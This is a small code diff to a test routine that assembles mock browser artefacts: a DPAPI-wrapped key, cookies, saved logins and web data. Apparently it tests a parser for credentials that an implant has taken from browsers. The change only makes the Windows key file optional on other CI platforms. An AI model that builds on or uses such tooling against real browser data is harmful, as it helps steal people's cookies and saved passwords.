@@ -113,14 +113,17 @@ def main():
     local_state = {"os_crypt": {"encrypted_key":
                    base64.b64encode(b"DPAPI" + dpapi_protect(key)).decode()}}
     ls_bytes = json.dumps(local_state).encode()
+    # on non-Windows CI runners DPAPI is unavailable; the Local State part is
+    # optional for the parser (the key arrives as aeskey.bin regardless)
 
     parts = {
-        "b:test/LocalState": ls_bytes,
         "b:test/aeskey.bin": dpapi_protect(key)[0:0] or key,  # key part = raw 32B (implant unwraps on host)
         "b:test/Default/Cookies": cookies_db,
         "b:test/Default/LoginData": logins_db,
         "b:test/Default/WebData": web_db,
     }
+    if sys.platform.startswith("win"):
+        parts["b:test/LocalState"] = ls_bytes
 
     report = []
     creds = {}
